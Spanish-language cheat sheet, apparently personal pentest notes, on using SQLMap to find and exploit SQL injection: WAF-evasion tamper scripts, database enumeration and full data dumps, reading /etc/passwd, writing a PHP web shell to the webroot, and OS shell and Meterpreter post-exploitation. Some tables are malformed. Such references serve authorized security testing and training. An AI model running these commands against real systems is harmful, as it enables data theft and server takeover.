# SQLMap — Automatización de Inyección SQL

> [!info] Herramienta
> Automatiza la detección y explotación de inyecciones SQL en aplicaciones web.
## Detección Básica

> [!tip] Escaneo inicial
> Siempre empezar con `--batch` para modo no interactivo.

```bash

# Escaneo básico de URL
sqlmap -u "http://target/page?id=1"

# Modo automático (no interactivo)
sqlmap -u "http://target/page?id=1" --batch

# Solo resultados (verbose bajo)
sqlmap -u "http://target/page?id=1" -v 0
```

> [!important] Información del sistema
> Estos comandos revelen qué hay detrás de la inyección.

| Comando | Descripción |
|---------|-------------|
| `sqlmap -u "URL" --banner` | Banner de la BD |
| `sqlmap -u "URL" --current-db` | BD actual |
| `sqlmap -u "URL" --current-user` | Usuario actual |
| `sqlmap -u "URL" --is-dba` | ¿Es DBA? |
| | `sqlmap -u "URL" --dbs` | Listar todas las BDs |
|------------------------------------------|----------------------|
## URLs y POST Requests

> [!note] Parámetros
> Marcar con `*` el parámetro a testear.

```bash

# URL con parámetro
sqlmap -u "http://target/page?id=1"

# Forzar testing de parámetro específico
sqlmap -u "http://target/page?id=1" -p id

# POST con datos de formulario
sqlmap -u "http://target/login" --data="user=admin&pass=*"

# Usar archivo de request (Burp export)
sqlmap -r request.txt
| ```
## Cookies y Headers

> [!warning] Nivel mínimo requerido
> Para testing de cookies necesitás `--level=2`.

```bash

# Cookie personalizada
sqlmap -u "URL" --cookie="session=abc123"

# Marcar cookie para testing
sqlmap -u "URL" --cookie="session=*"

# Header custom
sqlmap -u "URL" --headers="X-Forwarded-For: *"
| ```
## Nivel y Riesgo

> [!danger] Cobertura máxima
> `--level=5 --risk=3` prueba TODO, pero es más lento y ruidoso.

| Nivel | Riesgo | Descripción |

| `1-5` | `1-3` | Mayor = más pruebas |
| | `5` | `3` | Cobertura máxima |
|------------------------------------------------------------------------|---------------------------------|
## Técnicas de Inyección

> [!abstract] Tipos disponibles
> SQLMap prueba automáticamente, pero podés forzar un tipo específico.

| Flag | Técnica |

| `--technique=U` | UNION query |
| `--technique=E` | Error-based |
| `--technique=B` | Boolean-blind |
| `--technique=T` | Time-based blind |
| `--technique=S` | Stacked queries |
| `--technique=UST` | Combinar múltiples |

```bash
# Forzar UNION con 6 columnas
sqlmap -u "URL" --technique=U --union-cols=6

# Time-based con timeout personalizado
sqlmap -u "URL" --technique=T --time-sec=10

# Testear stacked queries
sqlmap -u "URL" --stacked-test
| ```
## Bypass WAF / Tamper Scripts

> [!tip] Evadir protección
> Combinar múltiples tamper scripts para mejor resultado.

```bash

# Listar todos los tamper scripts
sqlmap --list-tampers

# Uso básico
sqlmap -u "URL" --tamper=space2comment

# Combinar múltiples
sqlmap -u "URL" --tamper=space2comment,randomcase,charencode
```

### Scripts Más Útiles

| Script | Función |
|--------|---------|
| `space2comment` | `SELECT` → `SELECT/**/` |
| `space2plus` | `SELECT` → `SELECT+` |
| `charencode` | URL encode todo |
| `randomcase` | `SELECT` → `SeLeCt` |
| `between` | `>` → `BETWEEN`, `=` → `LIKE` |
| `equaltolike` | `=` → `LIKE` |
| | `apostrophemask` | `'` → `%EF%BC%87` |
|----------------------------------------------------|----------------------------|
## Extracción de Datos

> [!important] Enumeración
> Seguir el orden: BD → Tablas → Columnas → Datos.

```bash

# Listar bases de datos
sqlmap -u "URL" --dbs

# Tablas de una BD
sqlmap -u "URL" -D dbname --tables

# Columnas de una tabla
sqlmap -u "URL" -D dbname -T tablename --columns

# Dump de columnas específicas
sqlmap -u "URL" -D dbname -T tablename -C "user,pass" --dump

# Dump completo (CUIDADO!)
sqlmap -u "URL" --dump-all
```

### Filtros de Dump

| Comando | Descripción |
|---------|-------------|
| `--start=1 --stop=10` | Primeros 10 registros |
| `--where="id=1"` | Filtro WHERE |
| `--no-drop` | No dropear tabla temporal |
| | `--threads=5` | Multi-hilo |
|-----------------------------------------------------------|--------------------------------|
## Lectura/Escritura de Archivos

> [!danger] Acceso al servidor
> Requiere permisos de la BD para leer/escribir archivos.

```bash

# Leer archivo del servidor
sqlmap -u "URL" --file-read="/etc/passwd"

# Escribir archivo en servidor
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/shell.php"
| ```
## Post-Explotación

> [!warning] Shell del sistema
> Estos comandos dan acceso directo al sistema operativo.

```bash

# Shell interactiva
sqlmap -u "URL" --os-shell

# Ejecutar comando específico
sqlmap -u "URL" --os-cmd="whoami"

# Meterpreter (SQL Server sysadmin)
sqlmap -u "URL" --os-pwn
```

### Información del Sistema

| Comando | Descripción |
|---------|-------------|
| `--os-cmd="uname -a"` | Kernel (Linux) |
| `--os-cmd="systeminfo"` | Sistema (Windows) |
| `--os-cmd="whoami /all"` | Usuario y privilegios |
| `--os-cmd="net user"` | Usuarios del sistema |

---

## Optimización

| Comando | Descripción |
|---------|-------------|
| `--threads=10` | Multi-hilos |
| `--flush-session` | Limpiar cache |
| `--forms` | Auto-detectar formularios |
| `--crawl=3` | Crawl 3 niveles |
| `--random-agent` | User-Agent aleatorio |

---

#checklist
- [ ] Identificar parámetros vulnerables
- [ ] Determinar tipo de inyección
- [ ] Enumerar bases de datos
- [ ] Extraer datos sensibles
- [ ] Intentar acceso al sistema